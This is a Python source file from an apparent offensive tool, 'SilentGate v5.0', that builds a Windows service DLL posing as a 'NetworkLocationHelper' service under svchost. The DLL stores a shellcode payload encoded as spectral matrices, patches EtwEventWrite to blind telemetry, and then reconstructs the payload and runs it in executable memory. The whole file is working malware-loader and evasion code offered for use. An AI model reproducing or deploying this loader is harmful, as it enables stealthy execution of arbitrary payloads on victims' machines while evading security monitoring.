"""
SilentGate - v5.0 Component 1: Phantom Service DLL Generator
INPUT  : payload file path + metadata
OUTPUT : phantom_service.dll (Windows Service DLL)
         Exports: ServiceMain(), DllMain()
         Contains: IDFT reconstructor + spectral matrices
         No shellcode bytes anywhere

The DLL is loaded by svchost.exe as a legitimate service.
Windows Service Manager calls ServiceMain() on start.
ServiceMain() runs our spectral reconstruction + execution.
"""

import os
import sys
import subprocess
import json

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.gene1_payload_ingester       import ingest
from core.gene2_dft_encoder            import encode
from core.gene3_tensor_splitter        import split
from core.gene4_eigenvalue_camouflager import camouflage
from core.gene5_c_reconstructor_gen    import generate as gen_c

MINGW_CC = "x86_64-w64-mingw32-gcc"


def generate_dll_source(G_cam, A1_cam, A2_cam, G_n, A1_n, A2_n, metadata,
                        service_name="NetworkLocationHelper"):
    """
    Generate C source for Windows Service DLL.
    Wraps spectral reconstructor in ServiceMain().
    """
    import numpy as np

    rows, cols   = metadata["matrix_shape"]
    coeff_count  = metadata["coeff_count"]
    orig_len     = metadata["original_length"]
    padded_len   = metadata["padded_length"]
    rank         = metadata["rank"]

    G_clean  = (G_cam  - G_n).real
    A1_clean = A1_cam  - A1_n
    A2_clean = A2_cam  - A2_n

    def arr_to_c(arr, name):
        flat = arr.flatten()
        if np.iscomplexobj(flat):
            rv = ", ".join(f"{v.real:.17g}" for v in flat)
            iv = ", ".join(f"{v.imag:.17g}" for v in flat)
            return (f"static const double {name}_real[] = {{{rv}}};\n"
                    f"static const double {name}_imag[] = {{{iv}}};\n")
        else:
            v = ", ".join(f"{x:.17g}" for x in flat)
            return f"static const double {name}[] = {{{v}}};\n"

    dll_c = f"""/*
 * SilentGate v5.0 - Phantom Service DLL
 * Service: {service_name}
 * Author : JarDani  License: MIT
 *
 * Loaded by svchost.exe as a Windows service.
 * Payload stored as floating point spectral matrices.
 * No shellcode bytes in this file.
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsvc.h>
#include <math.h>
#include <stdlib.h>
#include <string.h>

#define PI          3.14159265358979323846
#define ORIG_LEN    {orig_len}
#define PADDED_LEN  {padded_len}
#define COEFF_COUNT {coeff_count}
#define ROWS        {rows}
#define COLS        {cols}
#define RANK        {rank}

/* Spectral factor matrices - floating point only */
{arr_to_c(G_clean,  "sg_G")}
{arr_to_c(A1_clean, "sg_A1")}
{arr_to_c(A2_clean, "sg_A2")}

/* IDFT implementation */
static void idft(double* rr, double* ri, int N,
                 double* or_, double* oi) {{
    int n, k;
    for(n=0; n<N; n++) {{
        or_[n]=0; oi[n]=0;
        for(k=0; k<N; k++) {{
            double a = 2.0*PI*k*n/N;
            or_[n] += rr[k]*cos(a) - ri[k]*sin(a);
            oi[n] += rr[k]*sin(a) + ri[k]*cos(a);
        }}
        or_[n]/=N; oi[n]/=N;
    }}
}}

/* Matrix multiply complex */
static void matmul_c(double* ar, double* ai, int ra, int ca,
                     double* br, double* bi, int rb, int cb,
                     double* cr, double* ci) {{
    int i,j,k;
    memset(cr,0,ra*cb*sizeof(double));
    memset(ci,0,ra*cb*sizeof(double));
    for(i=0; i<ra; i++) for(k=0; k<ca; k++) {{
        double are=ar[i*ca+k], aim=ai[i*ca+k];
        for(j=0; j<cb; j++) {{
            cr[i*cb+j] += are*br[k*cb+j] - aim*bi[k*cb+j];
            ci[i*cb+j] += are*bi[k*cb+j] + aim*br[k*cb+j];
        }}
    }}
}}

/* Reconstruct payload via IDFT */
static unsigned char* sg_reconstruct(int* out_len) {{
    int i,j;
    double* A1s_r = (double*)calloc(ROWS*RANK, sizeof(double));
    double* A1s_i = (double*)calloc(ROWS*RANK, sizeof(double));
    for(i=0; i<ROWS; i++) for(j=0; j<RANK; j++) {{
        A1s_r[i*RANK+j] = sg_A1_real[i*ROWS+j] * sg_G[j];
        A1s_i[i*RANK+j] = sg_A1_imag[i*ROWS+j] * sg_G[j];
    }}
    double* M_r = (double*)calloc(ROWS*COLS, sizeof(double));
    double* M_i = (double*)calloc(ROWS*COLS, sizeof(double));
    matmul_c(A1s_r,A1s_i,ROWS,RANK,
             (double*)sg_A2_real,(double*)sg_A2_imag,RANK,COLS,M_r,M_i);
    free(A1s_r); free(A1s_i);
    double* cr = (double*)calloc(PADDED_LEN, sizeof(double));
    double* ci = (double*)calloc(PADDED_LEN, sizeof(double));
    for(i=0; i<COEFF_COUNT && i<PADDED_LEN; i++) {{
        cr[i]=M_r[i]; ci[i]=M_i[i];
    }}
    free(M_r); free(M_i);
    double* rr = (double*)calloc(PADDED_LEN, sizeof(double));
    double* ri = (double*)calloc(PADDED_LEN, sizeof(double));
    idft(cr,ci,PADDED_LEN,rr,ri);
    free(cr); free(ci);
    unsigned char* p = (unsigned char*)malloc(ORIG_LEN);
    for(i=0; i<ORIG_LEN; i++) {{
        int v = (int)round(rr[i]);
        if(v<0) v=0; if(v>255) v=255;
        p[i] = (unsigned char)v;
    }}
    free(rr); free(ri);
    *out_len = ORIG_LEN;
    return p;
}}

/* ETW patch - silence telemetry before operations */
static void sg_patch_etw() {{
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if(!ntdll) return;
    FARPROC etw   = GetProcAddress(ntdll, "EtwEventWrite");
    if(!etw)  return;
    DWORD old = 0;
    VirtualProtect(etw, 1, PAGE_EXECUTE_READWRITE, &old);
    *(BYTE*)etw = 0xC3;
    VirtualProtect(etw, 1, old, &old);
}}

/* Execute reconstructed payload */
static void sg_execute() {{
    sg_patch_etw();

    int len = 0;
    unsigned char* payload = sg_reconstruct(&len);
    if(!payload) return;

    PVOID mem = VirtualAlloc(NULL, len,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if(!mem) {{ free(payload); return; }}

    memcpy(mem, payload, len);
    free(payload);

    DWORD old = 0;
    VirtualProtect(mem, len, PAGE_EXECUTE_READ, &old);

    HANDLE t = CreateThread(NULL, 0,
        (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    if(t) {{
        WaitForSingleObject(t, 10000);
        CloseHandle(t);
    }}
    VirtualFree(mem, 0, MEM_RELEASE);
}}


static DWORD WINAPI sg_execute_thread(LPVOID param) {{
    Sleep(300);
    sg_execute();
    return 0;
}}

/* Service control handler */
static SERVICE_STATUS          g_status  = {{0}};
static SERVICE_STATUS_HANDLE   g_handle  = NULL;

static VOID WINAPI sg_control_handler(DWORD ctrl) {{
    if(ctrl == SERVICE_CONTROL_STOP) {{
        g_status.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(g_handle, &g_status);
    }}
}}

/* ServiceMain - called by svchost when service starts */
VOID WINAPI ServiceMain(DWORD argc, LPSTR* argv) {{
    g_handle = RegisterServiceCtrlHandlerA(
        "{service_name}", sg_control_handler);
    if(!g_handle) return;

    g_status.dwServiceType      = SERVICE_WIN32_SHARE_PROCESS;
    g_status.dwCurrentState     = SERVICE_RUNNING;
    g_status.dwControlsAccepted = SERVICE_ACCEPT_STOP;

    SetServiceStatus(g_handle, &g_status);

    /* Report RUNNING to SCM before executing payload */
    /* Then run payload in background thread */
    HANDLE worker = CreateThread(NULL, 0,
        (LPTHREAD_START_ROUTINE)sg_execute_thread, NULL, 0, NULL);
    if(worker) {{
        WaitForSingleObject(worker, 15000);
        CloseHandle(worker);
    }}

    g_status.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_handle, &g_status);
}}

/* DllMain - called when DLL is loaded */
BOOL WINAPI DllMain(HINSTANCE hinstDLL,
                    DWORD     fdwReason,
                    LPVOID    lpvReserved) {{
    if(fdwReason == DLL_PROCESS_ATTACH) {{
        DisableThreadLibraryCalls(hinstDLL);
    }}
    return TRUE;
}}
"""
    return dll_c


def compile_dll(c_source_path, output_path):
    """Compile C source to Windows Service DLL."""
    cmd = [
        MINGW_CC,
        c_source_path,
        "-o", output_path,
        "-shared",
        "-lm",
        "-ladvapi32",
        "-O2",
        "-masm=intel",
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    return result.returncode == 0, result.stderr


def generate(payload_path, service_name="NetworkLocationHelper",
             output_dir="output"):
    """Main entry point — generate phantom service DLL."""
    os.makedirs(output_dir, exist_ok=True)

    print(f"[V5 DLL] Loading payload: {payload_path}")
    arr,   meta1 = ingest(payload_path, source_type="file")
    print(f"[V5 DLL] GENE 1: {meta1['size_bytes']} bytes")

    coeffs,meta2 = encode(arr, meta1)
    print(f"[V5 DLL] GENE 2: {meta2['coeff_count']} DFT coefficients")

    G,A1,A2,meta3 = split(coeffs, meta2)
    print(f"[V5 DLL] GENE 3: rank={meta3['rank']}")

    G_cam,A1_cam,A2_cam,G_n,A1_n,A2_n,meta4 = camouflage(G,A1,A2,meta3)
    print(f"[V5 DLL] GENE 4: eigenvalue camouflage applied")

    dll_src = generate_dll_source(
        G_cam,A1_cam,A2_cam,G_n,A1_n,A2_n,meta4,
        service_name=service_name
    )

    src_path = os.path.join(output_dir, "phantom_service.c")
    dll_path = os.path.join(output_dir, "phantom_service.dll")

    with open(src_path, "w") as f:
        f.write(dll_src)
    print(f"[V5 DLL] C source: {src_path} ({dll_src.count(chr(10))} lines)")
    print(f"[V5 DLL] main() present: {'int main' in dll_src}")

    print(f"[V5 DLL] Compiling DLL...")
    success, err = compile_dll(src_path, dll_path)

    if success:
        size = os.path.getsize(dll_path)
        print(f"[V5 DLL] Compiled: {dll_path} ({size:,} bytes)")
    else:
        print(f"[V5 DLL] Compile error: {err}")

    return success, dll_path, meta4


if __name__ == "__main__":
    success, dll_path, meta = generate(
        "tests/calc_payload.bin",
        service_name="NetworkLocationHelper"
    )
    print(f"\n[V5 DLL] SUCCESS: {success}")
    if success:
        print(f"[V5 DLL] OUTPUT : {dll_path}")
        print(f"[V5 DLL] NEXT   : v5_service_registrar.py")
